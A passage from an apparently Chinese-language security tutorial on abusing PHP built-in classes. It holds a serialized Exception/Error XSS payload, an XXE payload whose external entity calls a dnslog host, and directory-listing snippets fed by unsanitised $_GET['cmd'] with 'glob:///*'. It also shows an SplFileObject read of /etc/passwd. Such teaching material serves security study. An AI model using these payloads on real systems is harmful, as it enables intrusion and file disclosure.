class="language-none">O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215011423.png" alt loading="lazy"></p><p><strong>Exception Class Exp</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>　　<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>Payload</strong></p><pre class="language-none"><code class="language-none">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215327661.png" alt loading="lazy"></p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>XXE</p><p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p><p>利用实例化该类的对象来传入xml代码进行xxe攻击，进而读取文件内容和命令执行。</p><p><strong>payload</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span> <span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % remote SYSTEM "http://suhk4i.dnslog.cn">%remote;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span>&amp;xee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class);?></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521220408864.png" alt loading="lazy"></p><h3 id="SPL-File-Class"><a href="#SPL-File-Class" class="headerlink" title="SPL File Class"></a>SPL File Class</h3><h4 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h4><p><strong>DirectoryIterator</strong></p><p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 不加__toString()也可,因为echo可以自动调用</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521224348452.png" alt loading="lazy"></p><p><strong>FilesystemIterator</strong></p><p><strong>range</strong>：<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><p><strong>GlobIterator</strong></p><p><strong>range</strong>：<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">#payload : cmd=glob:///*</span></span></code></pre><h4 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h4><p><strong>SplFileObject</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$context</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521225031747.png" alt loading="lazy"></p><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open()"></a>ZipArchive::open()</h3><p>可进行文件删除操作</p><p><strong>range</strong>：<code>PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0</code></p><pre class="language-php" data-language="php"><code class="language-php">ZipArchive <span class="token punctuation">&#123;</span>    <span class="token comment">/* 方法 */</span>    <span class="token keyword">public</span> <span class="token function">addEmptyDir</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$dirname</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$entryname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addFromString</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$content</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">addGlob</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">addPattern</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">close</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">count</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span>    <span class="token keyword">public</span> <span class="token function">deleteIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">deleteName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token function">extractTo</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$destination</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">GetExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">getFromIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getFromName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getNameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">getStatusString</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token keyword">public</span> <span class="token function">getStream</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name">resource</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isCompressionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isEncryptionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">locateName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">open</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">int</span>    <span class="token keyword">public</span> <span class="token function">registerCancelCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">registerProgressCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">float</span> <span class="token variable">$rate</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">renameName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$new_name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">replaceFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$comment</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setCompressionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$compflags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setEncryptionName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">setMtimeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setMtimeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$timestamp</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>    <span class="token keyword">public</span> <span class="token function">setPassword</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$password</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">statIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">statName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>    <span class="token keyword">public</span> <span class="token function">unchangeAll</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeArchive</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>    <span class="token keyword">public</span> <span class="token function">unchangeName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#125;</span></code></pre><p><strong>use</strong>：<code>ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></p><p><strong>flags</strong>：The mode to use to open the 